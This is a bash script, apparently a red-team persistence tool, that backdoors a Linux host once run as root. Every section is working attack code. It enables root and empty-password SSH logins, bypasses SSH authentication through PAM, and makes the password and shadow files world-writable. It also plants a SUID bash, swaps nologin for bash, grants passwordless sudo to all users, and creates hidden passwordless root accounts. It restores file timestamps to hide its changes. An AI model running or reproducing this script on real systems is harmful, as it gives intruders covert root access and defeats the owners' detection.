#!/bin/bash

if [ $EUID -ne 0 ]; then
	echo "[!] Must run as root"
	exit 1
fi



# *** Helper Functions ***

# Colored text output
cecho () {
	ColorOff='\033[0m'
	BWhite='\033[1;37m'
	Red='\033[0;31m'
	Yellow='\033[0;33m'
	Cyan='\033[0;36m'
	Purple='\033[0;35m'
	Green='\033[0;32m'

	CechoUsage="${Red}[!] cecho usage: cecho <task|error|warning|info|debug|done> <\"log_message\">${ColorOff}"

	if [ $# -ne 2 ]; then
		echo -e "$CechoUsage"
		return 1
	fi

	LogType=$1
	LogMessage=$2

	case $LogType in
		"task")
			echo
			echo -e "${BWhite}[+] --- ${LogMessage}${ColorOff}"
			;;
		"error")
			echo -e "${Red}[!] ${LogMessage}${ColorOff}"
			;;
		"warning")
			echo -e "${Yellow}[-] ${LogMessage}${ColorOff}"
			;;
		"info")
			echo -e "${Cyan}[*] ${LogMessage}${ColorOff}"
			;;
		"debug")
			echo -e "${Purple}[?] ${LogMessage}${ColorOff}"
			;;
		"done")
			echo -e "${Green}[=] ${LogMessage}${ColorOff}"
			;;
		*)
			echo -e "$CechoUsage"
			;;
	esac
}

# Get a file's timestamp in YYYYMMDDhhmm format to use with "time -t"
get_timestamp () {
	if [ $# -ne 1 ]; then
		cecho error "$0 usage: $0 <file>"
		return 1
	fi
	
	file="$1"

	if ! stat -L "$file" | grep "Modify" | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "; then
		cecho error "Couldn't stat '$file'"
		return 1
	fi
}

set_timestamp () {
	if [ $# -ne 2 ]; then
		cecho error "set_timestamp usage: set_timestamp <timestamp> <file>"
		return 1
	fi

	timestamp="$1"
	file="$2"

	if ! touch -t "$timestamp" "$file"; then
		cecho error "Couldn't modify timestamp for '$file'"
		return 1
	else
		cecho info "Modified timestamp for '$file'"
	fi
}



# *** Configurable variables ***

SSHD_CONFIG="/etc/ssh/sshd_config"
SSHD_PAM="/etc/pam.d/sshd"

PASSWD="/etc/passwd"
SHADOW="/etc/shadow"
BACKUP_NOLOGIN="/sbin/nologging"
EXTRA_BASH="/sbin/nothing"
SUDOERS="/etc/sudoers"

declare -A NEW_ROOT_USERS # dictionary, key-value pairs
NEW_ROOT_USERS["restart"]="" # key: username, value: passwd comment
declare -A NEW_SYSTEM_USERS
NEW_SYSTEM_USERS["aptd"]="apt package daemon"
declare -A NEW_NORMAL_USERS
NEW_NORMAL_USERS["christian"]="youre not hacked i promise"
NEW_NORMAL_USERS["ezekiel"]=""
NEW_NORMAL_USERS["kordell"]=""
USER_HOME="/sbin"
USER_SHELL="/usr/sbin/nologin"
USER_PASSWORD="password123!"



# *** Main ***

cecho task "Weakening SSH"

if [ ! -f "$SSHD_CONFIG" ]; then
	cecho warning "SSHD configuration file '$SSHD_CONFIG' does not exist, skipping"
else
	sshd_timestamp=`get_timestamp "$SSHD_CONFIG"`

	# Make sshd config world writable
	chmod o+w "$SSHD_CONFIG" && cecho info "Made '$SSHD_CONFIG' world writable" || cecho error "Couldn't chmod '$SSHD_CONFIG'"

	# Allow SSH root login and passwordless login by modifying the sshd configuration file
	sed -i 's/.*PermitRootLogin.*/PermitRootLogin yes/g' $SSHD_CONFIG && sed -i 's/.*PermitEmptyPasswords.*/PermitEmptyPasswords yes/g' $SSHD_CONFIG && sed -i 's/.*PubkeyAuthentication.*/PubkeyAuthentication yes/g' $SSHD_CONFIG && sed -i 's/.*PasswordAuthentication.*/PasswordAuthentication yes/g' $SSHD_CONFIG && cecho info "Modified '$SSHD_CONFIG': enabled root, passwordless, public key, and password login" || cecho error "Couldn't modify '$SSHD_CONFIG'"
	set_timestamp $sshd_timestamp $SSHD_CONFIG

	# Restart the sshd service
	if which systemctl &>/dev/null; then
		systemctl restart sshd
	elif which service &>/dev/null; then
		service sshd restart
	else
		cecho error "Could not restart sshd service: 'systemctl' nor 'service' found on system"
	fi
	cecho info "Restarted the sshd service"
fi

if [ ! -f "$SSHD_PAM" ]; then
	cecho warning "SSHD PAM file '$SSHD_PAM' does not exist, skipping"
else
	if grep -q "pam_permit.so" "$SSHD_PAM"; then
		cecho info "SSH PAM authentication already bypassed"
	else
		pam_timestamp=`get_timestamp "$SSHD_PAM"`

		# Make sshd pam world writable
		chmod o+w "$SSHD_PAM" && cecho info "Made '$SSHD_PAM' world writable" || cecho error "Couldn't chmod '$SSHD_PAM'"
			
		# Allow SSH authentication with any password. The below line is added to the top of the SSHD_PAM file.
		sed -i '1s/^/auth       sufficient     pam_permit.so\n/' $SSHD_PAM && cecho info "SSH PAM authentication bypassed" || cecho error "Couldn't modify '$SSHD_PAM'"
		set_timestamp $pam_timestamp $SSHD_PAM
	fi
fi

cecho done "Weakening SSH done"



cecho task "Weakening important system files"

chmod o+w "$PASSWD" && cecho info "Made '$PASSWD' world writable" || cecho error "Couldn't modify timestamp for '$PASSWD'"
chmod o+rw "$SHADOW" && cecho info "Made '$SHADOW' world readable and writable" || cecho error "Couldn't modify timestamp for '$SHADOW'"

if [ -f "$BACKUP_NOLOGIN" ]; then
	cecho info "Backup nologin file '$BACKUP_NOLOGIN' already exists, skipping"
else
	sbin_timestamp=`get_timestamp "/sbin"`
	bin_timestamp=`get_timestamp "/bin"`
	nologin_path=`which nologin`
	mv "$nologin_path" "$BACKUP_NOLOGIN" && cp "`which bash`" "$nologin_path" && cecho info "Turned '$nologin_path' into a bash binary, real nologin backed up to '$BACKUP_NOLOGIN'" || cecho error "Couldn't replace '$nologin_path' with the bash binary"
	cp "`which bash`" "$EXTRA_BASH" && chmod u+s "$EXTRA_BASH" && cecho info "Created extra SUID bash binary '$EXTRA_BASH'" || cecho error "Couldn't create extra SUID bash binary '$EXTRA_BASH'"
	set_timestamp $sbin_timestamp "/sbin"
	set_timestamp $bin_timestamp "/bin"
fi

cecho warning "To-DO: setcap binaries to provide root shells, similar to SUID!"

cecho done "Done weakening important system files"



cecho task "Weakening sudo"

if [ ! -f "$SUDOERS" ]; then
	cecho error "Sudoers file '$SUDOER' does not exist, skipping"
else
	groupadd -f "users" && cecho info "Created group 'users'" || cecho error "Could not create group 'users'"
	groupadd -f "wheel" && cecho info "Created group 'wheel'" || cecho error "Could not create group 'wheel'"
	groupadd -f "sudo" && cecho info "Created group 'sudo'" || cecho error "Could not create group 'sudo'"

	echo '
	%users ALL=(ALL) NOPASSWD: ALL
	%wheel ALL=(ALL) NOPASSWD: ALL
	%sudo ALL=(ALL) NOPASSWD: ALL
	ALL ALL=(ALL) NOPASSWD: ALL' >> "$SUDOERS" && cecho info "Gave groups 'wheel', 'sudo', 'users', and every other user passwordless sudo permissions" || cecho error "Could not modify '$SUDOERS'"
fi

cecho done "Done weakening sudo"



cecho task "Setting passwords for all default nologin users"

cecho warning "TO-DO!"

cecho done "Done setting passwords for all default nologin users"



cecho task "Creating new root users"

if [ -z "$NEW_ROOT_USERS" ]; then
	cecho warning "No new root users to create, skipping"
else
	# Create the new passwordless root user
	passwd_timestamp=`get_timestamp "$PASSWD"`
	shadow_timestamp=`get_timestamp "$SHADOW"`
	for username in "${!NEW_ROOT_USERS[@]}"; do
		if grep -q "${username}:x:" "$PASSWD"; then
			cecho warning "User '$username' already exists, skipping"
		else
			# no-log-init, non-unique, uid, gid, no-create-home, comment, home-dir, shell, username
			useradd -l -o -u 0 -g 0 -M -c "${NEW_ROOT_USERS[$username]}" -d "$USER_HOME" -s "$USER_SHELL" "$username" && cecho info "Created new root user '$username'" || cecho error "Could not create new root user '$username'"
			sed -i "s/$username:[!*]*:/$username::/g" "$SHADOW" && cecho info "Made user '$username' have no password" || cecho error "Could not modify '$SHADOW' to make user '$username' passwordless"
		fi
	done
	set_timestamp $passwd_timestamp $PASSWD
	set_timestamp $shadow_timestamp $SHADOW
	cecho debug "If rearranging passwd or shadow, run these commands when done to modify the timestamps:
	touch -t $passwd_timestamp $PASSWD
	touch -t $shadow_timestamp $SHADOW"
fi

cecho done "Done creating new root users"



cecho task "Creating new system users"

if [ -z "$NEW_SYSTEM_USERS" ]; then
	cecho warning "No new system users to create, skipping"
else
	# Create the new passwordless root user
	passwd_timestamp=`get_timestamp "$PASSWD"`
	shadow_timestamp=`get_timestamp "$SHADOW"`
	for username in "${!NEW_SYSTEM_USERS[@]}"; do
		if grep -q "${username}:x:" "$PASSWD"; then
			cecho warning "User '$username' already exists, skipping"
		else
			# no-log-init, system, no-create-home, comment, home-dir, shell, groups, username
			useradd -l -r -M -c "${NEW_SYSTEM_USERS[$username]}" -d "$USER_HOME" -s "$USER_SHELL" -G "wheel,sudo,users" "$username" && cecho info "Created new system user '$username'" || cecho error "Could not create new system user '$username'"
			sed -i "s/$username:[!*]*:/$username::/g" "$SHADOW" && cecho info "Made user '$username' have no password" || cecho error "Could not modify '$SHADOW' to make user '$username' passwordless"
		fi
	done
	set_timestamp $passwd_timestamp $PASSWD
	set_timestamp $shadow_timestamp $SHADOW
	cecho debug "If rearranging passwd or shadow, run these commands when done to modify the timestamps:
	touch -t $passwd_timestamp $PASSWD
	touch -t $shadow_timestamp $SHADOW"
fi

cecho done "Done creating new system users"



cecho task "Creating new normal users"

if [ -z "$NEW_NORMAL_USERS" ]; then
	cecho warning "No new normal users to create, skipping"
else
	# Create the new passwordless root user
	passwd_timestamp=`get_timestamp "$PASSWD"`
	shadow_timestamp=`get_timestamp "$SHADOW"`
	for username in "${!NEW_NORMAL_USERS[@]}"; do
		if grep -q "${username}:x:" "$PASSWD"; then
			cecho warning "User '$username' already exists, skipping"
		else
			# no-log-init, comment, shell, groups, username, password
			useradd -l -c "${NEW_NORMAL_USERS[$username]}" -s "$USER_SHELL" -G "wheel,sudo,users" "$username" -p "$USER_PASSWORD" && cecho info "Created new normal user '$username' with password '$USER_PASSWORD'" || cecho error "Could not create new normal user '$username'"
		fi
	done
	set_timestamp $passwd_timestamp $PASSWD
	set_timestamp $shadow_timestamp $SHADOW
	cecho debug "If rearranging passwd or shadow, run these commands when done to modify the timestamps:
	touch -t $passwd_timestamp $PASSWD
	touch -t $shadow_timestamp $SHADOW"
fi

cecho done "Done creating new normal users"



echo
cecho done "--- SYSTEM WEAKENING COMPLETE ---"
cecho debug "Don't forget to delete me!"
